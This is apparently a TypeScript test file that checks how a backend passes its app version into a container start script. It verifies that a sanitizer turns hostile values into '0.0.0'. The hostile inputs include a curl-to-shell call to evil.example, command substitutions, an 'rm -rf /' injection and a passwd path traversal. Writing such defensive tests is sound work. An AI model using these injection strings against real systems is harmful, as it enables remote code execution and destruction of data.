import { describe, test, expect } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { APP_VERSION, sanitizeAppVersion } from "../../apps/backend/src/core/constants";

const repoRoot = join(import.meta.dir, "..", "..");

function read(rel: string): string {
  return readFileSync(join(repoRoot, rel), "utf8");
}

function readBackendCommandSources(): string {
  return [
    "apps/backend/src/core/commands.ts",
    "apps/backend/src/core/commands-registry-servers.ts",
    "apps/backend/src/core/commands-servers.ts",
  ]
    .map(read)
    .join("\n");
}

describe("codex bridge process environment", () => {
  test("there is no engine selection left to make", () => {
    // app-server is the only engine; `ORKESTRATOR_CODEX_ENGINE` was removed along
    // with the `codex exec` path. A reappearance means a second execution path is
    // back, which is what the consolidation removed.
    const commands = readBackendCommandSources();
    expect(commands).not.toContain("ORKESTRATOR_CODEX_ENGINE");
    expect(commands).not.toContain("resolveCodexEngine");

    const constants = read("apps/backend/src/core/constants.ts");
    expect(constants).not.toContain("ORKESTRATOR_CODEX_ENGINE");
    expect(constants).not.toContain("DEFAULT_CODEX_ENGINE");
  });

  test("both spawn paths forward the app version to app-server", () => {
    // app-server records `clientInfo.version` in its compliance logs, so it has to
    // reach the bridge on the local-worktree and container paths alike.
    const commands = readBackendCommandSources();
    expect(commands).toContain("env.ORKESTRATOR_VERSION = APP_VERSION;");
    expect(commands).toContain('export ORKESTRATOR_VERSION="${APP_VERSION}"');

    const desktopMain = read("apps/desktop/electron/main.ts");
    expect(desktopMain).toContain("appVersion: app.getVersion()");
  });

  test("both spawn paths forward the configured concurrent thread limit", () => {
    const commands = readBackendCommandSources();
    expect(commands).toContain("env[CODEX_MAX_CONCURRENT_THREADS_ENV] = String(");
    expect(commands).toContain(
      "export ${CODEX_MAX_CONCURRENT_THREADS_ENV}=${maxConcurrentThreads}",
    );
  });

  /**
   * `APP_VERSION` is interpolated into the `docker exec` script that starts the
   * container bridge, and it originates in the environment. Without sanitizing, a
   * hostile value would execute inside the container.
   */
  test("the app version cannot inject shell into the container start script", () => {
    const hostile = [
      '"; curl evil.example | sh; #',
      "$(whoami)",
      "`id`",
      "1.0.0; rm -rf /",
      "1.0.0\nexport EVIL=1",
      "../../etc/passwd",
      "a".repeat(200),
    ];

    for (const value of hostile) {
      const sanitized = sanitizeAppVersion(value);
      expect(sanitized).toBe("0.0.0");
      // Belt and braces: whatever comes back must be inert in a shell.
      expect(sanitized).toMatch(/^[A-Za-z0-9._+-]{1,64}$/);
    }
  });

  test("legitimate versions pass through unchanged", () => {
    for (const value of ["2.4.9", "1.0.0-rc.1", "0.145.0", "2.4.9+build.7"]) {
      expect(sanitizeAppVersion(value)).toBe(value);
    }
  });

  test("an absent or blank version degrades to a placeholder", () => {
    expect(sanitizeAppVersion(undefined)).toBe("0.0.0");
    expect(sanitizeAppVersion("   ")).toBe("0.0.0");
    // The exported constant is always shell-safe, whatever the environment holds.
    expect(APP_VERSION).toMatch(/^[A-Za-z0-9._+-]{1,64}$/);
  });

  test("the exported constant sanitizes a hostile child-process environment", async () => {
    const constantsPath = join(repoRoot, "apps", "backend", "src", "core", "constants.ts");
    const child = Bun.spawn(
      [
        process.execPath,
        "-e",
        `import { APP_VERSION } from ${JSON.stringify(constantsPath)}; process.stdout.write(APP_VERSION);`,
      ],
      {
        env: {
          ...process.env,
          ORKESTRATOR_VERSION: '"$(untrusted-command)"',
        },
        stdout: "pipe",
        stderr: "pipe",
      },
    );
    const [stdout, stderr, exitCode] = await Promise.all([
      new Response(child.stdout).text(),
      new Response(child.stderr).text(),
      child.exited,
    ]);

    expect(exitCode).toBe(0);
    expect(stderr).toBe("");
    expect(stdout).toBe("0.0.0");
  });
});
